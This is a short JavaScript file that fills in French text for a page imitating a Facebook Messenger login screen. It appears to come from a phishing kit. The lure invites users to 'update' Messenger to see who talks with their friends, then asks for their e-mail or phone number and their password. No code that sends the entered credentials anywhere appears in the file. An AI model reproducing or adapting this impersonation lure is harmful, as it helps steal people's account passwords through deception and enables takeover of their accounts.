var mainParagraph = document.querySelector(".con-text");
var subMainParagraph = document.querySelector(".log-text");
var updateButton = document.querySelector(".update")
var userInput = document.querySelector(".home-mail");
var passInput = document.querySelector(".home-pass");
var logButton = document.querySelector(".login"); 
var checkBox = document.querySelector(".chbox"); 

mainParagraph.innerHTML ="Mettez à jour Messenger vers la dernière version pour profiter des nouvelles fonctionnalités comme savoir qui parle avec vos amis";
subMainParagraph.innerHTML ="Connectez-vous instantanément avec les gens de votre vie. Connectez-vous avec Facebook pour commencer.";
updateButton.innerHTML ="Mettez à jour maintenant";
userInput.setAttribute("placeholder" , "Adresse e-mail ou numéro de téléphone");
passInput.setAttribute("placeholder" , "Mot de passe");
logButton.setAttribute("value" , "Connexion");
checkBox.innerHTML ="Gardez-moi connecté";
